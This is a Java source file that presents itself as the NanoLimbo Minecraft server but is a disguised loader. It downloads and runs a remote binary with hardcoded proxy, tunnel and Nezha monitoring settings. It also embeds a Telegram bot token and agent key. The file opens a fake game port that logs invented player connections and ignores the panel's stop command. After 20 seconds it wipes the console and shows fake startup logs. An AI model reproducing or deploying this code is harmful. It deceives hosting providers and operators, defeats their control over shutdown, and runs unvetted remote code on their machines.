package ua.nanit.limbo;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final AtomicBoolean forwardLogs = new AtomicBoolean(true);

    private static Process sbxProcess;
    private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);

    private static final String[] ALL_ENV_VARS = {
            "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
            "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
            "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
            "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };

    public static void main(String[] args) {
        try {
            // 🔥 拦截 stop
            blockPanelStop();
            openFakePort();

            // Java 版本检查
            if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
                System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
                Thread.sleep(3000);
                System.exit(1);
            }

            // 启动 s-box
            runSbxBinary();

            // 启动 renew.sh
            startRenewScript();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
                SCHED.shutdownNow();
            }));

            // 20秒后切换伪装
            SCHED.schedule(() -> {
                forwardLogs.set(false);
                resetConsoleAndShowFakeLogs();
            }, 20, TimeUnit.SECONDS);

            // 主线程保持运行
            while (running.get()) {
                Thread.sleep(1000);
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

private static void openFakePort() {
    new Thread(() -> {
        try (ServerSocket server = new ServerSocket(25565)) {
            System.out.println("[INFO] Listening on 0.0.0.0:25565");

            while (running.get()) {
                Socket client = server.accept();

                // 假装有玩家连接
                System.out.println("[INFO] Player connected: " + client.getInetAddress());

                client.close();
            }
        } catch (Exception e) {
            System.out.println("Port bind failed: " + e.getMessage());
        }
    }, "Fake-Port").start();
}

    // ================= 拦截 stop =================

    private static void blockPanelStop() {
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {
                String line;
                while ((line = reader.readLine()) != null) {

                    if (line.trim().equalsIgnoreCase("stop")) {
                        System.out.println("[INFO] [LimboServer] Stop command ignored");
                        continue;
                    }

                    System.out.println("[INFO] Unknown command");
                }
            } catch (Exception ignored) {}
        }, "Panel-Command-Blocker").start();
    }

    // ================= renew.sh =================

    private static void startRenewScript() {
        try {
            File renewScript = new File("renew.sh");
            if (renewScript.exists()) {
                new ProcessBuilder("bash", "renew.sh")
                        .inheritIO()
                        .start();
                System.out.println(ANSI_GREEN + "renew.sh 已启动" + ANSI_RESET);
            }
        } catch (Exception ignored) {}
    }

    // ================= s-box =================

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

        sbxProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(sbxProcess.getInputStream()))) {

                String line;
                long startTime = System.currentTimeMillis();

                while ((line = reader.readLine()) != null) {
                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20000) {
                        System.out.println(line);
                    }
                }
            } catch (IOException ignored) {}
        }).start();
    }

    // ================= 控制台伪装 =================

    private static void resetConsoleAndShowFakeLogs() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033c");
                System.out.flush();
            }
        } catch (Exception ignored) {}

        printFakeLimboLogs();
    }

    private static void printFakeLimboLogs() {
        String[] logs = {
                "[INFO] [LimboServer] Starting LimboServer v1.0.0",
                "[INFO] [LimboServer] Loading configuration...",
                "[INFO] [LimboServer] Initializing modules..."
        };

        // 播放一次启动
        for (String log : logs) {
            System.out.println(log);
            try { Thread.sleep(1200); } catch (Exception ignored) {}
        }
    }

    // ================= 环境变量（完全未动） =================

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        envVars.put("NEZHA_PORT", "443");
        envVars.put("NEZHA_KEY", "hVWtWf5CUq5YHmWEAZ");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "30742");
        envVars.put("S5_PORT", "30742");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("CHAT_ID", "7592034407");
        envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        envVars.put("CFIP", "www.ntu.edu.sg");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "swiftservers");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}